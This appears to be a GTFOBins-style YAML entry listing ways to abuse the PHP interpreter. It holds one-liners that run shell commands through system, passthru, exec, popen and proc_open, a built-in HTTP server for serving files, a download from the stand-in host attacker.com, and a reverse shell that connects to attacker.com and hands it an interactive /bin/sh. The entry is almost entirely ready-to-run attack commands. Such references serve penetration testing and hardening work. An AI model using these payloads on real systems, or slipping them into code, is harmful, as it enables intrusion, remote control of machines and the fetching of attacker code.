---
functions:
  exec-non-interactive:
    - code: |
        export CMD="ls /"
        php -r 'system($_ENV["CMD"]);'
    - code: |
        export CMD="ls /"
        php -r 'passthru($_ENV["CMD"]);'
    - code: |
        export CMD="ls /"
        php -r 'print(shell_exec($_ENV["CMD"]));'
    - code: |
        export CMD="ls /"
        php -r '$r=array(); exec($_ENV["CMD"], $r); print(join(\"\\n\",$r));'
    - code: |
        export CMD="ls /"
        php -r '$h=@popen($_ENV["CMD"],"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
    - code: |
        export CMD="ls /"
        php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open($_ENV["CMD"], $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
  upload:
    - description: Serve files in the local folder running an HTTP server.
      code: |
        LHOST=0.0.0.0
        LPORT=8888
        php -S $LHOST:$LPORT
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |-
        export URL=http://attacker.com/file_to_get
        export LFILE=where_to_save
        php -r '$c=file_get_contents($_ENV["URL"]);file_put_contents($_ENV["LFILE"], $c);'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345 
        php -r '$sock=fsockopen($_ENV["RHOST"],$_ENV["RPORT"]);exec("/bin/sh -i <&3 >&3 2>&3");'
---